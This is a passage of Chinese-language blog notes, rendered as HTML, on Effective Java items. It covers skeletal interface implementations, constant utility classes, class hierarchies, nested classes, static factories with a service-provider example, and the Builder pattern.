class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>Bus实现骨架类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bus</span> <span class="keyword">implements</span> <span class="title class_">Vehicle</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> isRun;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> price;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isRun == <span class="number">0</span>) &#123;</span><br><span class="line">            isRun = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isRun == <span class="number">1</span>) &#123;</span><br><span class="line">            isRun = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start() != <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;启动成功&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已启动&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="21-为后代设计接口"   >          <a href="#21-为后代设计接口" class="heading-link"><i class="fas fa-link"></i></a><a href="#21-为后代设计接口" class="headerlink" title="21.为后代设计接口"></a>21.为后代设计接口</h2>              <h2 id="22-接口只用于定义类型"   >          <a href="#22-接口只用于定义类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#22-接口只用于定义类型" class="headerlink" title="22.接口只用于定义类型"></a>22.接口只用于定义类型</h2>      <p>工具类</p><ul><li>不可实例化</li><li>静态公有常量</li></ul><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PhysicalConstants</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">PhysicalConstants</span><span class="params">()</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">AVOGADROS_NUMBER</span> <span class="operator">=</span> <span class="number">6.02214199e23</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">BOLTZMANN_CONSTANT</span> <span class="operator">=</span> <span class="number">1.3806503e-23</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">ELECTRON_MASS</span> <span class="operator">=</span> <span class="number">9.10938188e-31</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Use of static import to avoid qualifying constants</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">atoms</span><span class="params">(<span class="type">double</span> mols)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AVOGADROS_NUMBER * mols;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="23-类层次优于标签类"   >          <a href="#23-类层次优于标签类" class="heading-link"><i class="fas fa-link"></i></a><a href="#23-类层次优于标签类" class="headerlink" title="23.类层次优于标签类"></a>23.类层次优于标签类</h2>      <p>类层次</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class hierarchy replacement for a tagged class</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Figure</span> &#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">extends</span> <span class="title class_">Figure</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> radius;</span><br><span class="line"> </span><br><span class="line">    Circle(<span class="type">double</span> radius) &#123; <span class="built_in">this</span>.radius = radius; &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span> &#123; <span class="keyword">return</span> Math.PI * (radius * radius); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">extends</span> <span class="title class_">Figure</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> length;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> width;</span><br><span class="line"> </span><br><span class="line">    Rectangle(<span class="type">double</span> length, <span class="type">double</span> width) &#123;</span><br><span class="line">        <span class="built_in">this</span>.length = length;</span><br><span class="line">        <span class="built_in">this</span>.width  = width;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span> &#123; <span class="keyword">return</span> length * width; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">extends</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    Square(<span class="type">double</span> side) &#123;</span><br><span class="line">        <span class="built_in">super</span>(side, side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="24-优先考虑静态成员类"   >          <a href="#24-优先考虑静态成员类" class="heading-link"><i class="fas fa-link"></i></a><a href="#24-优先考虑静态成员类" class="headerlink" title="24.优先考虑静态成员类"></a>24.优先考虑静态成员类</h2>      <p>嵌套类</p><ul><li>静态成员类</li><li>非静态成员类</li><li>匿名类</li><li>局部类</li></ul><p>匿名类</p><ul><li>在使用的同时被声明和实例化</li><li>可以出现在任何允许出现表达式的地方</li><li>没有静态成员</li><li>无法实现多个接口，或者同时扩展类并实现接口</li><li>保持简短，否则影响可读性</li><li>创建函数对象</li></ul>        <h1 id="第二章-创建和销毁对象-1"   >          <a href="#第二章-创建和销毁对象-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二章-创建和销毁对象-1" class="headerlink" title="第二章 创建和销毁对象"></a>第二章 创建和销毁对象</h1>              <h2 id="用静态工厂方法代替构造器"   >          <a href="#用静态工厂方法代替构造器" class="heading-link"><i class="fas fa-link"></i></a><a href="#用静态工厂方法代替构造器" class="headerlink" title="用静态工厂方法代替构造器"></a>用静态工厂方法代替构造器</h2>      <p>Service Provider 框架</p><p>样例代码</p><p>接口</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    AnimalFactory <span class="title function_">newService</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>静态工厂</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnimalFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Animal&gt; animals =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Animal&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_ANMIAL_NAME</span> <span class="operator">=</span> <span class="string">&quot;&lt;def&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">DefaultAnimal</span><span class="params">(Animal a)</span> &#123;</span><br><span class="line">        registerProvider(DEFAULT_ANMIAL_NAME, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerProvider</span><span class="params">(String name, Animal p)</span>&#123;</span><br><span class="line">        animals.put(name,p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> AnimalFactory <span class="title function_">newInstance</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        <span class="keyword">return</span> newInstance(DEFAULT_ANMIAL_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> AnimalFactory <span class="title function_">newInstance</span><span class="params">(String name)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> animals.get(name);</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalAccessException</span>(</span><br><span class="line">                    <span class="string">&quot;No provider registered with name: &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> a.newService();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>主函数</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException &#123;</span><br><span class="line">        AnimalFactory.registerProvider(<span class="string">&quot;Cat&quot;</span>, Cat);</span><br><span class="line">        AnimalFactory.registerProvider(<span class="string">&quot;Dog&quot;</span>, Dog);</span><br><span class="line"></span><br><span class="line">        <span class="type">AnimalFactory</span> <span class="variable">Cat</span> <span class="operator">=</span> AnimalFactory.newInstance(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">AnimalFactory</span> <span class="variable">Dog</span> <span class="operator">=</span> AnimalFactory.newInstance(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(Cat);</span><br><span class="line">        System.out.println(Dog);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 注册对应的类 利用接口实现匿名内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Animal</span> <span class="variable">Cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> AnimalFactory <span class="title function_">newService</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AnimalFactory</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span> <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;This is Cat&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Animal</span> <span class="variable">Dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> AnimalFactory <span class="title function_">newService</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AnimalFactory</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;This is Dog&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="遇到多个构造器参数用构造器"   >          <a href="#遇到多个构造器参数用构造器" class="heading-link"><i class="fas fa-link"></i></a><a href="#遇到多个构造器参数用构造器" class="headerlink" title="遇到多个构造器参数用构造器"></a>遇到多个构造器参数用构造器</h2>      <p>JavaBeans模式</p>        <h2 id="Builder模式-1"   >          <a href="#Builder模式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Builder模式-1" class="headerlink" title="Builder模式"></a>Builder模式</h2>      <p>适用于类层次结构</p><p>创建Builder对象引入额外开销</p><p>Person类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String mName;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> mAge;</span><br><span class="line">    <span class="keyword">public</span> String mLocation;</span><br><span class="line">    <span class="keyword">public</span> String mGender;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String mJob;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Builder</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Builder</span>&lt;T&gt;&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String mName;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> mAge;</span><br><span class="line">        <span class="keyword">private</span> String mLocation;</span><br><span class="line">        <span class="keyword">private</span> String mGender;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String mJob;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">Builder</span><span class="params">(String mName)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mName = mName;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">abstract</span> Person <span class="title function_">build</span><span class="params">()</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">abstract</span> T <span class="title function_">self</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmAge</span><span class="params">(<span class="type">int</span> mAge)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mAge = mAge;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmLocation</span><span class="params">(String mLocation)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mLocation = mLocation;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmGender</span><span class="params">(String mGender)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mGender = mGender;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">SetmJob</span><span class="params">(String mJob)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mJob = mJob;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Person(Builder&lt;?&gt; builder) &#123;</span><br><span class="line">        <span class="built_in">this</span>.mAge = builder.mAge;</span><br><span class="line">        <span class="built_in">this</span>.mName = builder.mName;</span><br><span class="line">        <span class="built_in">this</span>.mGender = builder.mGender;</span><br><span class="line">        <span class="built_in">this</span>.mLocation = builder.mLocation;</span><br><span class="line">        <span class="built_in">this</span>.mJob = builder.mJob;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>Hight类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hight</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> mHight;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Builder</span> <span class="keyword">extends</span> <span class="title class_">Person</span>.Builder&lt;Builder&gt;&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">double</span> mHight;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">Builder</span><span class="params">(String mName)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(mName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Hight <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Hight</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Builder <span class="title function_">self</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Builder <span class="title function_">SetmHight</span><span class="params">(<span class="type">int</span> mHight)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mHight = mHight;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Hight</span><span class="params">(Builder builder)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(builder);</span><br><span class="line">        mHight = builder.mHight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;名字：&quot;</span> + mName + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;性别：&quot;</span> + mGender + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;年龄：&quot;</span> + mAge + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;身高：&quot;</span> + mHight + <span class="string">&quot;cm&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;职业：&quot;</span> + mJob + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;地址：&quot;</span> + mLocation + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>Weight类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Weight</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> mWeight;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Builder</span> <span class="keyword">extends</span> <span class="title class_">Person</span>.Builder&lt;Builder&gt;&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">double</span> mWeight;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">Builder</span><span class="params">(String mName)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(mName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Weight <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Weight</span>(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> Builder <span class="title function_">self</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Builder <span class="title function_">SetmWeight</span><span class="params">(<span class="type">int</span> mWeight)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mWeight = mWeight;</span><br><span class="line">            <span class="keyword">return</span> self();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Weight</span><span class="params">(Builder builder)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(builder);</span><br><span class="line">        mWeight = builder.mWeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;名字：&quot;</span> + mName + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;性别：&quot;</span> + mGender + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;年龄：&quot;</span> + mAge + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;体重：&quot;</span> + mWeight + <span class="string">&quot;kg&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                + <span class="string">&quot;职业：&quot;</span> + mJob + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;地址：&quot;</span> + mLocation + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>主函数</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 